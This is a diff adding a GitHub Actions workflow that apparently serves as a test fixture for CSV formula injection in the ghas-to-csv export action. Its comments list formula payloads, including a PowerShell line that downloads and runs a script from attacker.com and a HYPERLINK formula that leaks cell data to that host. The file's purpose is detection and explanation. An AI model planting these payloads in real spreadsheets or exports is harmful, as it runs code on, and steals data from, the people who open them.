@@ -1,0 +1,41 @@
+# GHSA-634p-93h9-92vh: CSV injection in exported files
+# Advisory: https://github.com/advisories/GHSA-634p-93h9-92vh
+# Affected Action: some-natalie/ghas-to-csv
+# Vulnerability Type: CSV Formula Injection (Output Format Issue)
+# Expected Detection Rule: Not detectable by static analysis (output format vulnerability)
+
+name: GHSA-634p-93h9-92vh Vulnerable Pattern
+on:
+  schedule:
+    - cron: '0 0 * * 0'
+
+jobs:
+  vulnerable:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Export GHAS alerts to CSV
+        uses: some-natalie/ghas-to-csv@v1.0.0
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+          output: security-alerts.csv
+
+      # Vulnerability: The exported CSV file may contain formula injection
+      # payloads if alert data includes special characters like:
+      #   =cmd|'/c calc'!A1
+      #   +cmd|'/c calc'!A1
+      #   -cmd|'/c calc'!A1
+      #   @cmd|'/c calc'!A1
+      #
+      # When the CSV is opened in Excel/LibreOffice, these formulas execute
+      # arbitrary commands on the user's machine.
+      #
+      # Example malicious alert:
+      # Repository name: "=cmd|'/c powershell IEX(wget attacker.com/mal.ps1)'!A1"
+      # Alert description: "+HYPERLINK(\"http://attacker.com?leak=\"&A1&A2,\"Click here\")"
+
+      - name: Upload CSV artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: security-report
+          path: security-alerts.csv
+          # Users downloading and opening this CSV are at risk
